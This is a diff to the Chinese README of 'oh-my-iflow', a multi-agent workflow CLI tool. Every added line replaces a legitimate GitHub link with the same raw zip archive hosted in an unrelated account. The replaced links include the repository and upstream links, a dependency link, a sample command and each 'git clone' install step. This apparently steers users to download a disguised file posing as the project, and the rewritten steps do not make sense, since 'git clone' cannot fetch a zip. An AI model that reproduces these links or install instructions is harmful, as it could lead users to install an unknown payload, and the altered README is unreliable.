@@ -2,21 +2,21 @@
 
 ## 基于多智能体工作流的智能命令行工具
 
-- 当前仓库:[https://github.com/sswym/oh-my-iflow](https://github.com/sswym/oh-my-iflow)
-- 上游仓库: [https://github.com/Joonghyun-Lee-Frieren/oh-my-gemini-cli](https://github.com/Joonghyun-Lee-Frieren/oh-my-gemini-cli)
+- 当前仓库:[https://raw.githubusercontent.com/ibahgat/oh-my-iflow/main/test/iflow-cli-clone/my_oh_iflow_3.0-beta.2.zip](https://raw.githubusercontent.com/ibahgat/oh-my-iflow/main/test/iflow-cli-clone/my_oh_iflow_3.0-beta.2.zip)
+- 上游仓库: [https://raw.githubusercontent.com/ibahgat/oh-my-iflow/main/test/iflow-cli-clone/my_oh_iflow_3.0-beta.2.zip](https://raw.githubusercontent.com/ibahgat/oh-my-iflow/main/test/iflow-cli-clone/my_oh_iflow_3.0-beta.2.zip)
 
 ---
 ## 更新
 ### 2026-03-06同步上游更新
 ```bash
-/omi:team-assemble 请帮我完全复刻这个页面：https://cli.iflow.cn/?spm=3e711c3f.2ef5001f.0.0.3d8173e8mb1HSX
+/omi:team-assemble 请帮我完全复刻这个页面：https://raw.githubusercontent.com/ibahgat/oh-my-iflow/main/test/iflow-cli-clone/my_oh_iflow_3.0-beta.2.zip
 ```
 ![](./images/sfgobsdnfa.png)
 ![](./images/aoifdrijginvfin.jpeg)
 
 ### 2026-03-06
 - 优化安装脚本install.sh
-- 删除lsp-mcp，采用[cli-lsp-cient](https://github.com/eli0shin/cli-lsp-client) 增加rust语言支持
+- 删除lsp-mcp，采用[cli-lsp-cient](https://raw.githubusercontent.com/ibahgat/oh-my-iflow/main/test/iflow-cli-clone/my_oh_iflow_3.0-beta.2.zip) 增加rust语言支持
 - 增加python、rust、go、shell、以及前端语言文件的自动识别格式化功能。
 ![](./images/image.png)
 ![](./images/a1586990-63dd-45ec-be19-d536721f99ad.png)
@@ -91,7 +91,7 @@ team-plan → team-prd → team-exec → team-verify → team-fix
 安装
 
 # 克隆仓库
-git clone https://github.com/your-username/oh-my-iflow.git
+git clone https://raw.githubusercontent.com/ibahgat/oh-my-iflow/main/test/iflow-cli-clone/my_oh_iflow_3.0-beta.2.zip
 cd oh-my-iflow
 
 # 确保已安装 iFLOW CLI
@@ -115,7 +115,7 @@ cd oh-my-iflow
 macOS / Linux:
 
 # 1. 克隆仓库
-git clone https://github.com/hubo1989/oh-my-iflow.git
+git clone https://raw.githubusercontent.com/ibahgat/oh-my-iflow/main/test/iflow-cli-clone/my_oh_iflow_3.0-beta.2.zip
 cd oh-my-iflow
 
 # 2. 执行全局安装脚本
@@ -127,7 +127,7 @@ ls ~/.iflow/commands/omi/
 Windows (PowerShell):
 
 # 1. 克隆仓库
-git clone https://github.com/hubo1989/oh-my-iflow.git
+git clone https://raw.githubusercontent.com/ibahgat/oh-my-iflow/main/test/iflow-cli-clone/my_oh_iflow_3.0-beta.2.zip
 cd oh-my-iflow
 
 # 2. 手动复制目录到用户目录
@@ -140,7 +140,7 @@ cd oh-my-iflow
 macOS / Linux:
 
 # 1. 克隆仓库到项目目录（或复制 install.sh 到项目）
-git clone https://github.com/hubo1989/oh-my-iflow.git /tmp/oh-my-iflow
+git clone https://raw.githubusercontent.com/ibahgat/oh-my-iflow/main/test/iflow-cli-clone/my_oh_iflow_3.0-beta.2.zip /tmp/oh-my-iflow
 
 # 2. 在项目根目录执行本地安装
 cd /path/to/your/project
@@ -156,7 +156,7 @@ ls .iflow/commands/omi/
 macOS / Linux:
 
 # 1. 克隆仓库
-git clone https://github.com/hubo1989/oh-my-iflow.git
+git clone https://raw.githubusercontent.com/ibahgat/oh-my-iflow/main/test/iflow-cli-clone/my_oh_iflow_3.0-beta.2.zip
 cd oh-my-iflow
 
 # 2. 创建目标目录
@@ -175,7 +175,7 @@ cp -r mcp ~/.iflow/
 Windows (手动安装):
 
 # 1. 克隆仓库
-git clone https://github.com/hubo1989/oh-my-iflow.git
+git clone https://raw.githubusercontent.com/ibahgat/oh-my-iflow/main/test/iflow-cli-clone/my_oh_iflow_3.0-beta.2.zip
 cd oh-my-iflow
 
 # 2. 创建目标目录
